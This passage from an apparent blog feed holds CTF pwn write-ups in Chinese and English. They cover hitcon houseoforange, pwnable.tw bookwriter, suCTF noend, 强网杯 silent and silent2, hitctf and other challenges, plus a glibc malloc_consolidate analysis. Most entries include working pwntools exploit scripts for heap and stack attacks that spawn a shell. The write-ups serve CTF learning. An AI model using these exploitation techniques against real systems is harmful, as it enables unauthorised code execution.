libc.symbols['malloc']libc.address = libc_base_addrEdit(p, 3, p64(elf.got['free']))Edit(p, 0, p64(libc.symbols['system']))Delete(p, 1)p.interactive()p.close() Relevant Articlehttps://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcon 2016 houseoforange writeup]]></title>
    <url>%2F2018%2F07%2F03%2Fhitcon16-houseoforange%2F</url>
    <content type="text"><![CDATA[0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the other is the name. At the end of the Build(), a variable on bss will store the new house address and use it in Upgrade() and See(). We can use Upgrade() and See() to update and see the newest house. 12345678910111213141516171819202122232425262728293031323334353637int Build()&#123; //... if ( (unsigned int)COUNT &gt; 3 ) &#123; puts("Too many house"); exit(1); &#125; New_House = malloc(0x10uLL); printf("Length of name :"); size = InputNum(); if ( size &gt; 0x1000 ) size = 4096; *((_QWORD *)New_House + 1) = malloc(size); if ( !*((_QWORD *)New_House + 1) ) &#123; puts("Malloc error !!!"); exit(1); &#125; printf("Name :"); InputString(*((void **)New_House + 1), size); new_price = calloc(1uLL, 8uLL); printf("Price of Orange:", 8LL); *new_price = InputNum(); Show_Color(); printf("Color of Orange:"); Color_Num = InputNum(); //... if ( Color_Num == 56746 ) new_price[1] = 56746; else new_price[1] = Color_Num + 30; *(_QWORD *)New_House = new_price; Last_House = New_House; ++COUNT; return puts("Finish");&#125; 0x01 Program VulnerabilitiesWhen the program calls the Upgrade(), it allows user to give it the length of the name which leads to heap overflow: 123456789101112int Upgrade()&#123; //... printf("Length of name :"); v2 = InputNum(); if ( v2 &gt; 0x1000 ) v2 = 4096; printf("Name:"); InputString((void *)Last_House[1], v2); //... return puts("Finish");&#125; So, use unsorted bin attack and house of orange to get the shell. 0x02 Pwn!First we need to use heap overflow to trigger _int_free() in sysmalloc() to leak the libc address. 12345678910111213141516171819def pwn(): p = process('./houseoforange') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' Build(p, 0x80, 'sunichi1', 0x10, 1) # 1 # overflow the top chunk's size payload = 'B'*0x80 + p64(0) + p64(0x21) + p32(0x1) + p32(0x1f) + 2 * p64(0) + p64(0xf31) Upgrade(p, 0x100, payload, 0x10, 2) # 2 # trigger free in sysmalloc Build(p, 0x1000, 'sunichi2', 0x10, 3) # 3 # get the info of libc address Build(p, 0x400, 'x', 4, 4) # 0x400 = 1024 =&gt; large bin / still have some questions See(p) p.recvuntil('house : ') libc_addr = p.recv(6) libc_addr = u64(libc_addr.ljust(8, '\x00')) libc.address = libc_addr - 0x3c4b78 - 0x600 libc_base_addr = libc_addr - 0x3c4b78 - 0x600 Second, leak the heap address. 1234567# leak the heap addressUpgrade(p, 0x400, '1' * 0x10, 0x10, 5)See(p)p.recvuntil('1' * 0x10)heap_addr = p.recv(6)# address is the third house content address - 0x10heap_addr = u64(heap_addr.ljust(8, '\x00')) The final step is to construct the a chunk to perform unsorted bin attack and house of orange. 12345678910111213141516171819# unsorted bin attack and house of orangepayload = ''payload = payload.ljust(0x400, '\x00') + p64(0) + p64(0x21) + p64(0x2300000010) + p64(0)vtable = heap_addr + 0x410 + 0x20 + 0xc0 + 0x10 + 0x8 # point to vtable itself# change top chunk to 0x61 size and forge the streamfake_stream = '/bin/sh\x00' + p64(0x61) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) # here is heap + 0x410 + 0x20fake_stream = fake_stream.ljust(0xa0, '\x00')fake_stream += p64(heap_addr + 0x410 + 0x20 + 0xc0 + 0x10)fake_stream = fake_stream.ljust(0xc0, '\x00')fake_stream += p64(1) + 2 * p64(0) # here is heap + 0x410 + 0x20 + 0xc0fake_stream += p64(vtable)payload += fake_streampayload += p64(2)payload += p64(3)payload += p64(libc.symbols['system'])Upgrade(p, len(payload), payload, 0x10, 6) Call Build() to trigger malloc(0x10) and get shell. 1234p.recvuntil('Your choice : ')p.sendline('1')p.interactive()p.close() Relevant Articlehttps://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/ http://tacxingxing.com/2018/01/10/house-of-orange/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>hitcon</tag>
        <tag>2016</tag>
        <tag>house</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable tw bookwriter writeup]]></title>
    <url>%2F2018%2F07%2F02%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvironment: I use 64 bit to make example. Condition: Control unsorted chunk’s bk pointer. Unsorted Bin uses FIFO strategy. Steps: Set free unsorted chunk’s pointer to target_addr - 0x10, this chunk will be the first free chunk in Unsorted Bin. Call malloc, the first free chunk will be put into the corresponding bin. Then the operations below will be performed: 1234victim = unsorted_bin(av)-&gt;bk = p;bck = victim-&gt;bk = target_addr - 0x10; // victim-&gt;bk is p-&gt;bkunsorted_bin(av)-&gt;bk = bck;bck-&gt;fd = unsorted_bin(av); // bck-&gt;fd is *(target_addr) So, use Unsorted Bin Attack can set target_addr’s value to main_arean+88. 0x02 FSOPFSOP(File-Stream Oriented Programming), like ROP and SROP, but it use FILE struct to construct the exploit chain. One of the use of FSOP is House Of Orange. FSOP mainly use _IO_ﬂush_all_lockp function, it flushes all standard I/O stream before process being terminated. It travels all FILE struct by element _chain pointer. The code: 123456789101112131415161718192021222324252627282930313233int _IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp; last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; // travel by _chain &#125; return result;&#125; According to the code above, _IO_flush_all_lockp which called by abort will call_IO_OVERFLOW (fp, EOF), and we can hijack 用_IO_OVERFLOW through FILE struct’s vtable. There are 3 situations that program will call abort: glibc abort exit function main return When there occurs some errors in malloc, it will call malloc_printerr and then malloc_printerr calls abort. This exploit makes advantage of changing _IO_list_all and forges vtable which includes _IO_OVERFLOW pointer. 1234567891011121314151617181920212223242526272829303132extern struct _IO_FILE_plus *_IO_list_all;struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;;typedef struct _IO_FILE FILE;struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* ... */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);&#125;; 0x03 Pwnable.tw bookwriterleak libc information and heap addressAt the beginning of the program, pwner needs to input the name of author on bss_0x602060 which behind the chunk_list(bss_0x6020A0). Pwner can input a string of length 0x40 without \x00, when program output the author’s name, the heap address leaks. In Edit() function, there are two lines of code following, in InputString() function, it doesn’t end up input string with \x00 which leads to larger string length. 12InputString((__int64)CHUNK_LIST[idx], SIZE_LIST[idx]);SIZE_LIST[idx] = strlen(CHUNK_LIST[idx]); The first part of expolit: 12345678910111213141516171819def pwn(): p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' p.recvuntil('Author :') # input auther name of length 0x40 without \x00 p.send('A' * 0x40) Add(p, 0x18, 'A' * 0x18) # 0 sleep(0.3) # extend size of chunk 0 Edit(p, 0, 'A' * 0x18) # overflow top chunk size and let its size to be 0xfe1 Edit(p, 0, '\x00' * 0x18 + '\xe1\x0f\0') # leak heap address by author name recv = Info(p, null, 0) heap_addr = u64(recv['old_author'][0x40:].ljust(8, '\x00')) - 0x10 print hex(heap_addr) But how to leak libc information while there is no free() in the program? When user malloc a chunk whose size is larger than top chunk, the program will call sysmalloc() and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with main_arena. 12345678910# trigger free in sysmalloc, now the top chunk size is 0xfe1Add(p, 0x1000, 'sunichi') # 1 0x1000 &gt; 0xfe1Add(p, 0x40, 'sunichi!') # 2# leak libc addressrecv = View(p, 2)main_arena_88 = u64(recv[8:].ljust(8, '\x00'))libc_base_addr = main_arena_88 - 0x3c4b78 - (1640 - 88)system_addr = libc_base_addr + libc.symbols['system']io_list_all_addr = libc_base_addr + libc.symbols['_IO_list_all'] unsorted bin attack and perform house of orange to get the shellNow, we know the heap and libc address and the next step is to perform unsorted bin attack. First, construct a chunk of size 0x61. When it comes to malloc(1), the fake chunk will be put into fastbin[4]. Use unsorted bin attack, _IO_list_all will be changed to main_arena+88. After the fake chunk being put into fastbin[4], the malloc() will continue to find the next free unsorted chunk. Because next chunk’s size is 0, malloc() then triggers printerr(). So the program searches the FILE struct from _IO_list_all whose value is already main_arena+88 and calls FILE_OVERFLOW(). The first FILE struct is invalid, and through the main_arena+88-&gt;_chain(main_arena+216), the program will find the next FILE struct whose address is fastbin[4]’s first chunk which is forged by pwner. So the following code will be triggered: 1FILE_OVERFLOW(fp, EOF) =&gt; system(fp) =&gt; system('/bin/sh') The last part of exploits: 123456789101112131415161718192021222324252627# Index overflow, the size of chunk[0] will be changed to heap address for i in range(0x3, 0x9): Add(p, 0x20, str(i) * 0x20) vtable_addr = heap_addr + 0x248 payload = 0x170 * '\x00' fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(io_list_all_addr - 0x10) # unsorted bin attack fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_addr + 0x250) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += p64(1) + 2 * p64(0) + p64(vtable_addr) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(system_addr) Edit(p, 0, payload) p.recvuntil('Your choice :') p.sendline(str(1)) p.recvuntil('Size of page :') p.sendline(str(0x10)) p.interactive() Relevant Articlehttps://bbs.pediy.com/thread-223334.htm http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/ http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF 2018 pwn noend writeup]]></title>
    <url>%2F2018%2F06%2F15%2Fsuctf18-pwn-noend%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 使用IDA查看程序，发现此题所存在的漏洞。 12345678910111213141516while ( 1 )&#123; do &#123; memset(&amp;s, 0, 0x20uLL); read(0, &amp;s, 0x1FuLL); size = strtoll(&amp;s, 0LL, 10); buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; write(1, buf, (unsigned __int16)size); write(1, &amp;unk_B54, 1uLL); &#125; while ( size &gt; 127 ); free(buf);&#125; 在进行malloc时，并未检查是否malloc成功，malloc失败会返回0，导致后续存在任意地址写\x00的漏洞。首先需要泄漏libc的地址。 1234567891011121314151617181920def sar(p, size, content): p.sendline(str(size)) sleep(0.3) p.send(content) sleep(0.3) p.recvuntil(content)def pwn(): p = process('./noend') one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] context.update(log_level='debug') sar(p, 0x20, 'sunichi') sar(p, 0x30, 'sunichi') sar(p, 0x7f, 'sunichi') sar(p, 0x20, 'A' * 8) recv = p.recvuntil('\n', drop=True) main_arena_addr = u64(recv[0:8]) libc_base_addr = main_arena_addr - 0x3c4b78 #malloc_hook = libc_base_addr + 0x3c4b10 free_hook = libc_base_addr + 0x3c67a8 根据free时，chunk合并的特性，能够使最后top chunk的fd和bk指向main_arena。malloc(0x20)后，其中的信息并不会清空，导致libc地址泄漏。 123p.sendline(str(main_arena_addr))sleep(0.3)p.clean() 申请一个非常大的chunk，使libc重新申请arena。使用前述同样的方法泄漏地址。 1234567sar(p, 0x20, 'sunichi')sar(p, 0x30, 'sunichi')sar(p, 0x7f, 'sunichi')sar(p, 0x20, 'A' * 8)recv = p.recvuntil('\n', drop=True)[0:8]top_chunk_ptr = u64(recv)top_chunk = u64(recv) + 0x888 泄漏的地址指向top chunk，在这使用硬编码计算伪造的top chunk与泄漏的地址的偏移。（本地没问题，不知道remote会不会有问题，等端午放完假再问问师傅） 12345sar(p, 0xf0, p64(libc_base_addr + one_gadget[3] + (free_hook - top_chunk - 0x10)) * (0xe8 / 8))p.sendline(str(top_chunk_ptr + 1))sleep(0.3)p.sendline()sleep(0.3) 接着对申请的chunk进行填充，填充的值为one_gadget_addr + (free_hook_addr - top_chunk_addr - 0x10)。继续申请一个很大的chunk，此时libc不会再有新的arena了，而是申请失败返回0，导致任意地址写入\x00。在这我们向指向top chunk的地址末位写入\x00，导致top chunk指针向前移动，指向了我们之前申请的chunk的content部分。此时，伪造top chunk完成。 1234p.sendline(str(free_hook - top_chunk - 0x10))sleep(0.3)p.sendline()sleep(0.3) malloc(free_hook - top_chunk - 0x10)，使得top chunk的size变为one_gadget_addr。同时top chunk的地址变为top_chunk_addr + free_hook - top_chunk - 0x10 = free_hook - 0x10，free_hook处被填入one_gadget_addr。随后获取shell。（注意地址对齐的问题） 123sar(p, 0x10, 'pwn')p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ptmalloc malloc_consolidate分析]]></title>
    <url>%2F2018%2F06%2F04%2Fptmalloc-malloc_consolidate%2F</url>
    <content type="text"><![CDATA[尝试做了下suCTF2018的noend，用到的泄漏的libc地址的方法之前未遇到过，顺带对malloc_consolidate的源代码进行了学习。 以下分析基于glibc-2.23进行。 在free中，当达到某些条件的时候，会调用malloc_consolidate进行fastbin的chunk的合并。 首先，函数检查prev_chunk是否处于使用中，如果空闲，进行合并。 123456if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -(long)prevsize); unlink(av, p, bck, fwd);&#125; 如果下一个chunk不是top_chunk，进行如下操作： 如果next_chunk空闲，合并next_chunk 如果next_chunk使用中，将next_chunk的prev_inuse位置为0 接着将本chunk放入unsorted bin中： 123first_unsorted = unsorted_bin-&gt;fd;unsorted_bin-&gt;fd = p;first_unsorted-&gt;bk = p; 如果本chunk不在small bin范围内，清空fd_nextsize和bk_nextsize。接着设置本chunk的属性： 1234set_head(p, size | PREV_INUSE);p-&gt;bk = unsorted_bin;p-&gt;fd = first_unsorted;set_foot(p, size); 如果下一个chunk是top_chunk，进行合并： 123size += nextsize;set_head(p, size | PREV_INUSE);av-&gt;top = p; 所以，当fastbin中有两个不同大小的chunk时，能使top chunk的bk和fd指向main_arena。]]></content>
      <tags>
        <tag>heap</tag>
        <tag>libc</tag>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent2 writeup]]></title>
    <url>%2F2018%2F04%2F16%2Fqwb18-pwn-silent2%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 此题与silent几乎完全一致，仅是在malloc的时候做了大小限制： 123if ( size != 0x10 &amp;&amp; size &lt;= 127 ) exit(0);v3 = malloc(size); 因此此题需要依靠unsorted bin和unlink漏洞进行利用。首先申请5个chunk： 12345New(0x100, 'Hack by sunichi') # chunk_0New(0x100, 'Hack by sunichi') # chunk_1New(0x100, 'Hack by sunichi') # chunk_2New(0x100, 'Hack by sunichi') # chunk_3New(0x100, 'Hack by sunichi') # chunk_4 随后free chunk_3、chunk_4： 12Delete(3) # size 0x110Delete(4) # size 0x110 构造payload，0x6020c0为程序保存申请的chunk的地址的列表，首先我们要确保能通过unlink的安全检查，因此与0x6020c0有关的两个地址需要相差0x8，其次我们需要利用unlink改写列表中的值，进而写入got表地址然后进行覆写，unlink能达到的效果是对目标地址（第3个p64）+0x18的位置上写入其自身，我们在这就可以将list[3]的值替换为list[0]的地址，因此第三个p64的地址为target_addr - 0x18。填充完后，伪造chunk，prev_size为0x100，size为0x100： 12payload = p64(0) + p64(0x101) + p64(0x6020c0 + 0x18 - 0x18) + p64(0x6020c0 + 0x18 - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(0x110)New(0x210, payload) # chunk_5 Double Free并且通过编辑chunk_3将list[0]改写为free@got，然后将system@plt写入free@got： 123Delete(4)Edit(3, p64(elf.got['free']))Edit(0, p64(elf.plt['system'])) 拿到shell： 1234New(0x100, '/bin/sh\x00') # chunk_6Delete(6) # Get shellp.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent writeup]]></title>
    <url>%2F2018%2F04%2F15%2Fqwb18-pwn-silent%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 使用IDA查看程序，发现此题存在Double Free，可以进行fastbin attack，并修改free@got的地址为system后获取shell。 该题一开始会执行下列指令： 1system("cat banner.txt"); 使用gdb进行调试的时候这里有一个坑（不过在这里调用了一次system应该是方便了后面的漏洞利用），gdb默认会去调试子进程，导致无法继续调试主进程，因此需要设置gdb： 1set follow-fork-mode parent 首先申请3个fastbin chunk： 123New(0x50, 'Hack by sunichi') # chunk_0New(0x50, 'Hack by sunichi') # chunk_1New(0x50, '/bin/sh\x00') # chunk_2 为什么要选取0x50作为chunk的大小？因为在got表起始地址附近，能作为fastbin chunk的size的数据只有0x602002处的0xe168000000000060。malloc函数被调用时，会使用unsigned int对size做类型转换，在这里size就被转换成了0x60，与我们申请的0x50（content）+0x10（chunk头）大小的chunk一致。 随后进行fastbin attack： 123Delete(0)Delete(1)Delete(0) 三次释放后，header -&gt; 0 -&gt; 1 -&gt; 0 -&gt; 0x00。接着我们申请fastbin chunk： 1234567New(0x50, p64(0x601ffa)) # 0x602002 - 8# header -&gt; 1 -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0x601ffaNew(0x50, 'A' * 14 + p64(elf.plt['system'])) # Overwrite free@got 接着调用system函数，由于我们第1次申请的chunk_2的content中为字符串/bin/sh，因此此时调用free(chunk_2)等于system(‘/bin/sh’)： 123Delete(2)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn250 DragonBall writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn250%2F</url>
    <content type="text"><![CDATA[此题的漏洞主要是在第4个选项，即wish函数中，在里面有栈溢出漏洞，能够利用栈溢出返回到任意地址中。用ida查看程序，需要集齐7龙珠才能许愿。初始有15元，购买1个龙珠5元，出售1个龙珠3元，在购买时进行下述检查： 1234if ( !money ) return puts("You don't have enough money.");money -= 5;++dragon_ball_num; 只要金钱不为0，就可以一直购买，因此先购买1个龙珠、卖出1个龙珠，然后再连续购买7个龙珠即可。 1234buy()sell()for i in range(0, 7): buy() 保护措施如下： 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 因此我们可以让程序返回到栈上去执行我们注入的shellcode。使用pattern获取返回值的偏移，为0xa4。wish函数中，两次输入长度分别为0x64和0x40，使用pwntool生成shellcode： 1asm(shellcraft.i386.linux.sh()) shellcode长度为44，两次输入有部分区域重叠，非重叠区域为0x68-0x38=48，刚好能够容纳得下shellcode，shellcode能完整的写入。为了使函数能够返回到栈上，我们需要泄漏栈地址信息。 1234567891011121314int wish()&#123; char v1; // [esp+0h] [ebp-68h] int v2; // [esp+30h] [ebp-38h] memset(&amp;v1, 0, 0x60u); if ( dragon_ball_num != 7 ) return puts("You can't make a wish."); printf("Tell me your wish: "); read_input_raw(&amp;v1, 0x68); printf("Your wish is %s, is it right?\n(Y/N) ", &amp;v1); read_input_raw(&amp;v2, 0x40); return puts("OK.");&#125; 第一次输入的0x68长度的字符串后正好是ebp地址，因此写入长为0x68的字符串即可让printf函数打印出ebp信息： 123456p.recvuntil('choice: ')p.sendline('4')payload = 'A' * 0x68p.sendline(payload)p.recvuntil(payload)ebp = u32(p.recv(4)) 获取栈信息后构造新的payload拿shell： 12345678p.recvuntil('choice: ')p.sendline('4')execve_sh = asm(shellcraft.i386.linux.sh())payload = execve_sh + 'A' * (0xa4 - len(execve_sh)) + p32(ebp - 0x88)p.sendline(payload)p.interactive()p.close() 0x88为main函数到shellcode的偏移，因为wish函数栈大小为0x68，main函数为0x20，因此此处为0x88。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn100&pwn200 writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn100%26pwn200%2F</url>
    <content type="text"><![CDATA[0x00 pwn100保护措施： 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) pwn100为简单的栈溢出： 123456789int vuln()&#123; char buf; // [esp+0h] [ebp-28h] puts("Welcome to pwn world!\nLeave your name:"); fflush(stdout); read(0, &amp;buf, 64u); // StackOverflow Here 64 -&gt; 40 return puts("bye~");&#125; 只要将vuln函数的返回地址覆盖掉即可，使其返回到flag函数中，同时还需要构造flag函数的参数： 123456789int __cdecl flag(int a1, int a2)&#123; if ( a1 != 0xDEADBEEF ) CheckFailed(); command = "cat flag"; if ( a2 != 0xC0FFEE ) CheckFailed(); return system(command);&#125; payload构造如下： 1payload = 'A' * 44 + p32(flag_addr) + p32(0xdeadbeef) + p32(0xdeadbeef) + p32(0xc0ffee) 0x01 pwn200保护措施 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 该程序先进行登录，再进行验证，验证通过后获得flag： 12345678910111213141516171819202122232425262728293031323334353637383940414243signed int login()&#123; signed int v1; // [esp+4h] [ebp-14h] int n; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] v1 = 255; printf("Username: "); n = read_input_raw((int)bss_username, 16); printf("Password: "); v3 = read_input_raw((int)bss_password, 32); if ( !strncmp(bss_username, "root", n) &amp;&amp; !strncmp(bss_password, "passwd_has_be_changed_in_remote_", v3) ) return 0; if ( !strncmp(bss_username, "lilac", n) &amp;&amp; !strncmp(bss_password, "a_password_you_know_uh_huh_^_^@!", v3) ) v1 = 16; return v1;&#125;signed int check()&#123; signed int v1; // [esp+Ch] [ebp-Ch] v1 = 0; if ( !strncmp(bss_username, "root", 4u) ) &#123; puts("Correct username!"); v1 = 1; &#125; else &#123; puts("Incorrect username!"); &#125; if ( !strncmp(bss_password, "passwd_has_be_changed_in_remote_", 32u) ) &#123; puts("Correct password!"); ++v1; &#125; else &#123; puts("Incorrect password!"); &#125; return v1;&#125; 可以看出，在login函数中，只对用户输入的长度的数据进行字符串比较；而在check函数中，则对整个0x20长的字符串进行比较。从这也可以看出实际的密码长度为0x20。因此此题进行32长度的字符串逐位爆破即可。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cyberearth xctf pwn stack writeup]]></title>
    <url>%2F2018%2F02%2F02%2Fcyberearth-xctf-pwn-stack%2F</url>
    <content type="text"><![CDATA[第一次和大佬们一起参加CTF比赛，在pwn中选了一个栈溢出的题目来做。 先丢到ida中，如其名“跑马灯”，程序会在跑完三轮跑马灯前的最后一次，设置一个定时器并在2秒后触发进入死循环handler。在跑马灯结束到触发alarm之前，有一个窗口可以提供输入。 1234signal(14, (__sighandler_t)handler);alarm(2u);//......return gee(); 提供输入在gee函数内，buf长度为0x88，read读入上限为0x100，可以溢出，offset为140。 123char buf; // [esp+0h] [ebp-88h]puts("*...........................................................");return read(0, &amp;buf, 0x100u); // buf length 0x88 overflow 通过简单的实验可知，先前的signal和alarm可以被后来的signal和alarm所覆盖，因此首先通过溢出令alarm(2u)失效。 12345678910# waitprint p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')print p.recvuntil('*...........................................................')# disable alarm# 0x8048b5e call geepayload = 'a' * 140 + p32(alarm_plt) + p32(0x8048b5e) + p32(0)p.sendline(payload) 编写leak函数并进行泄漏： 123456789101112131415def leak(addr): payload = 'a' * 140 + p32(write_plt) + p32(0x8048b5e) + p32(1) + p32(addr) + p32(4) print p.recvuntil('...\n') p.send(payload) data = p.recv(4) # print data return datad = DynELF(leak, elf=ELF('./stack'), libcdb=False)execve_addr = d.lookup('execve', 'libc')print 'execve:' + hex(execve_addr)system_addr = d.lookup('system', 'libc')print 'system:' + hex(system_addr)libcbase_addr = d.bases()['/lib/i386-linux-gnu/libc.so.6']print 'libc base addr:' + hex(libcbase_addr) 在实际做题中，可以根据泄漏的函数地址找到对应的libc版本从而获取/bin/sh的偏移地址，由于没有环境，故直接导入本地libc。曾经尝试调用system并通过read读入/bin/sh字符串，但失败（包括先调用start恢复栈帧）。 1234libc = ELF('./libc.so.6')binsh_offset = next(libc.search('/bin/sh'))print '/bin/sh offset:' + hex(binsh_offset)binsh_addr = libcbase_addr + binsh_offset 调用execve即可拿到shell： 1234payload = 'a' * 140 + p32(execve_addr) + p32(0xdeadbeef) + p32(binsh_addr) + p32(0) + p32(0)p.send(payload)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>xctf</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rctf 2015 welpwn writeup]]></title>
    <url>%2F2018%2F01%2F09%2Frctf15-welpwn%2F</url>
    <content type="text"><![CDATA[buf的空间大小为0x400，read()的读入长度也为0x400。进入echo()函数继续查找。 字符串s2长度为0x10，内容从buf进行拷贝，当遇到\x00时特，停止拷贝。栈布局如下 size data 0x10 s2 0x08 saved ebp 0x08 return address 0x400 buf 构造如下payload：1payload = 'a' * 24 + return_addr 由于字符串复制遇\x00终止，因此最多只能传入一个地址。但由于返回地址之后就是我们所输入的buf，所以需要利用buf进行控制。buf的前32字节为上述payload，因此需要利用gadget从栈中移除32字节，使用pop四次返回即可，随后便进入预先设计好的控制流中。由于原先的返回地址非\x00长度与pop4_addr相同，因此可以成功写入。leak函数设计如下： 12345678910def leak(addr): payload = 'a' * 24 + p64(pop4_addr) payload += p64(pop6_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(addr) + p64(1) payload += p64(call_addr) + 'a' * 56 payload += p64(start_addr) payload = payload.ljust(0x400, 'a') p.send(payload) data = p.recv(8) p.recv(0x400) return data 获取system地址后： 12345678payload = 'a' * 24 + p64(pop4_addr)payload += p64(pop6_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(bss_addr) + p64(0)payload += p64(call_addr) + 'a' * 56payload += p64(poprdi_addr) + p64(bss_addr) + p64(system_addr)payload = payload.ljust(0x400, 'a')p.send(payload)p.send('/bin/sh\x00')p.interactive() 参考文章和bin下载：https://www.anquanke.com/post/id/85129]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>rctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lctf 2016 pwn100 writeup]]></title>
    <url>%2F2018%2F01%2F07%2Flctf16-pwn100%2F</url>
